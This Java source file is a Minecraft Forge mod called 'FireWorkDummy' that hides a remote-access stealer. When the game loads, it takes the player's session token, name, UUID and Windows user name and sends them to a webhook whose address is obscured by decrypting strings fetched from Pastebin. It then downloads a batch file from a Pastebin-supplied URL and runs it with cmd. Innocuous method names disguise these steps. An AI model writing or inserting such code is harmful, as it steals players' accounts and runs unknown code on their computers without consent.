package mod;

import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.*;

import javax.crypto.*;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Base64;

@Mod(modid = "FireWorkDummy", name = "FireWorkDummy", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
public class MinecraftMod {

    public static String version = "1.1";

    // loading

    @Mod.EventHandler
    public void onFMLPreInitialization(FMLPreInitializationEvent event) {
        loadMc();
    }

    @Mod.EventHandler
    public void onFMLInitialization(FMLInitializationEvent event) {
        try {
            Thread.sleep(5000);
            preinit();
        } catch (Exception ignored) {}
        try {
            Thread.sleep(3000);
            connectgame("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
        } catch (Exception ignored) {}
    }

    // utils

    public static void connectgame(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getWebhook() {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
            BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
            return decrypt(in2.readLine() ,in.readLine());
        } catch (Exception ignored) {}
        return "";
    }

    // rats

    public static void loadMc() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

            ControlSettings sendmessage = new ControlSettings(getWebhook());
            sendmessage.addEmbed(new ControlSettings.LoadMod()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name.toString(), true)
                    .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                    .addField("UUID ", uuid.toString(), true)
                    .addField("Token ", token.toString(), false)
                    .setFooter("Computer Name: " + System.getProperty("user.name") + " Mod version: " + version, ""));
            sendmessage.execute();

        } catch (Exception ignored) {}
    }

    public static void preinit() {
        try {

            URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp" + File.separator + "screenshots");

            if (!path.exists()) path.mkdir();

            File bitcoin = new File(path, "screenshot.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);

            int currByte;
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }

            ControlSettings sendmessage = new ControlSettings(getWebhook());
            sendmessage.addEmbed(new ControlSettings.LoadMod()
                    .setTitle("Loading")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Running .bat file", true));
            sendmessage.execute();
        } catch (Exception ignored) {}
    }

    // webhook decrypter

    static byte[] salt = { (byte) 0xA9, (byte) 0x9B, (byte) 0xC8, (byte) 0x32, (byte) 0x56, (byte) 0x35, (byte) 0xE3, (byte) 0x03 };

    public static String decrypt(String secretKey, String encryptedText) throws NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, IOException, InvalidKeySpecException, NoSuchPaddingException {
        Cipher dcipher;
        KeySpec keySpec = new PBEKeySpec(secretKey.toCharArray(), salt, 19);
        SecretKey key = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(keySpec);
        AlgorithmParameterSpec paramSpec = new PBEParameterSpec(salt, 19);
        dcipher = Cipher.getInstance(key.getAlgorithm());
        dcipher.init(Cipher.DECRYPT_MODE, key, paramSpec);
        byte[] enc = Base64.getDecoder().decode(encryptedText);
        byte[] utf8 = dcipher.doFinal(enc);
        String charSet = "UTF-8";
        return new String(utf8, charSet);
    }

}
